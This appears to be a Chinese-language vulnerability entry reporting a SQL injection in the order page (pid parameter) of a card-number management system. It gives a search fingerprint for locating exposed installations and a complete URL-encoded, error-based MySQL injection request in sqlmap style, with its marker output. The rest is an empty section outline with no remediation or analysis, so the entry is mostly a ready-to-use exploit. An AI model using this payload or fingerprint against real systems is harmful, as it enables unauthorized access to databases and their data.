# 卡号极团管理系统order存在SQL注入漏洞

- **系统**：卡号极团管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`icon_hash="-795291075"`
- **请求**：`GET /order/index.php?pid=1%27+AND+GTID_SUBSET%28CONCAT%280x716a6a7171%2C%28SELECT+%28ELT%287046%3D7046%2C1%29%29%29%2C0x7162786b71%29%2C7046%29--+NqPh HTTP/1.1`

**请求体 / payload**
```
qjjqq1qbxkq
sqlmap
/order/index.php?pid=1
```

**其他**
- 卡号极团管理系统order存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 卡号极团管理系统